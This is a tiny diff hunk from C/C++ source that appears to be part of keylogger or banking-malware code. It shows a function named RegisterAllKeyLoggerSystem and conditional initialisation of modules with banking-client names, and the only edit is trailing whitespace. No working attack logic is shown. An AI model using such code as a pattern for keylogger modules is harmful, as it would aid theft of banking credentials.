@@ -204,7 +204,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 	#endif
 
 	#ifdef AvangardWebModule
-		AvangardWeb::Init();
+		AvangardWeb::Init(); 
 	#endif
 
 	#ifdef IFobsH
